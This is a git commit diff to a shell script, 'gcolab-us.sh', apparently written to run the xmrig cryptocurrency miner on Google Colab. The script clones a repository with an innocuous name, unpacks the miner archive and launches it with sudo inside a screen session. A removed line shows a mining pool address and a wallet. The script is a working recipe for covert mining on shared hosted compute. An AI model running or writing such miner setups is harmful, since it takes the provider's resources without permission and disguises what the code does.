69dc48b5510d0947bde58745e84eed4257a73ea9
burocos <112254195+burocos@users.noreply.github.com>
2022-09-01 04:18:28 +0800

    Update gcolab-us.sh

--- gcolab-us.sh
+++ gcolab-us.sh
@@ -10,5 +10,6 @@ screen -R xmr
 git clone https://github.com/burocos/ngorok.git
 cd ngorok
 tar xvf xmrig-ngorok.tar.gz
-cd xmrig-ngro
-sudo ./xmrig -o stratum+ssl://rx.unmineable.com:443 -a rx -k -u SHIB:0x8cc95e87e9110269f61e5f40e88dbe6c347e7ac0.GLAB
+rm xmrig-ngorok.tar.gz
+cd xmrig-ngorok
+sudo ./xmrig
